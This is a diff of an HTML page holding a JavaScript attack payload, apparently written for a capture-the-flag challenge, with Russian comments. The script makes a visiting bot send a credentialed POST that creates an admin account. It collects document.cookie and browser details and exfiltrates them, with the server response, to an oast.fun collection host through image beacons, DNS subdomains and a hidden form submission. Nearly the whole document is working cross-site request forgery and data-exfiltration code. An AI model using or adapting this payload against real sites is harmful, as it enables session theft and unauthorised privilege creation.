@@ -2,49 +2,93 @@
 <html>
 <body>
 <script>
-(async () => {
-  let respText = "";
-  let status = "ERR";
+// 1. Собираем информацию о боте
+const botInfo = {
+    cookies: document.cookie,
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    timestamp: new Date().toISOString(),
+    location: window.location.href,
+    referrer: document.referrer
+};
 
-  try {
-    const r = await fetch("https://tasks.goidactf.ru:20246/create_admin", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: "new_admin_login=ctfadmin_" + Date.now(),
-      credentials: "include",
-      mode: "cors"
-    });
+// 2. Кодируем информацию
+const encodedInfo = btoa(JSON.stringify(botInfo));
 
-    status = r.status;
-    respText = await r.text();
+// 3. Сначала отправляем информацию о боте
+new Image().src = "https://" + encodeURIComponent(encodedInfo) + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
 
-  } catch (e) {
-    respText = "FETCH_ERR:" + e;
-  }
-
-  /* ===== 1. QUERY‑EXFIL (полный ответ) ===== */
-  const full = btoa(unescape(encodeURIComponent(
-    status + "|" + respText
-  )));
-
-  new Image().src =
-    "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?q=" +
-    encodeURIComponent(full);
-
-  /* ===== 2. DNS‑EXFIL (коротко) ===== */
-  const short = (status + "|" + respText.slice(0,40))
-    .split("")
-    .map(c => c.charCodeAt(0).toString(36))
-    .join("-")
-    .slice(0,60);
-
-  new Image().src =
-    "https://" + short +
-    ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
-
-})();
+// 4. Делаем POST запрос через fetch и отправляем ответ на другой subdomain
+fetch('https://tasks.goidactf.ru:20246/create_admin', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Referer': 'https://tasks.goidactf.ru:20246/',
+        'Origin': 'https://tasks.goidactf.ru:20246'
+    },
+    body: 'new_admin_login=ctfadmin_' + Date.now(),
+    credentials: 'include'
+})
+.then(response => {
+    // Получаем статус и текст ответа
+    return Promise.all([
+        response.text(),
+        Promise.resolve({
+            url: response.url,
+            status: response.status,
+            statusText: response.statusText,
+            headers: Object.fromEntries(response.headers.entries())
+        })
+    ]);
+})
+.then(([responseText, responseMeta]) => {
+    // 5. Формируем полный ответ
+    const fullResponse = {
+        botInfo: botInfo,
+        request: {
+            url: 'https://tasks.goidactf.ru:20246/create_admin',
+            method: 'POST'
+        },
+        response: {
+            ...responseMeta,
+            body: responseText
+        },
+        timestamp: new Date().toISOString()
+    };
+    
+    // 6. Кодируем и отправляем на webhook
+    const encodedResponse = btoa(JSON.stringify(fullResponse));
+    
+    // Используем другой subdomain для ответа
+    new Image().src = "https://response-" + encodeURIComponent(encodedResponse) + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
+    
+    // Или отправляем через POST запрос
+    const responseForm = document.createElement('form');
+    responseForm.method = 'POST';
+    responseForm.action = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/capture';
+    responseForm.style.display = 'none';
+    responseForm.enctype = 'text/plain';
+    
+    const textarea = document.createElement('textarea');
+    textarea.name = 'data';
+    textarea.value = JSON.stringify(fullResponse, null, 2);
+    responseForm.appendChild(textarea);
+    
+    document.body.appendChild(responseForm);
+    responseForm.submit();
+})
+.catch(error => {
+    // 7. Отправляем ошибку
+    const errorData = {
+        botInfo: botInfo,
+        error: error.toString(),
+        timestamp: new Date().toISOString()
+    };
+    
+    const encodedError = btoa(JSON.stringify(errorData));
+    new Image().src = "https://error-" + encodeURIComponent(encodedError) + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
+});
 </script>
 </body>
 </html>
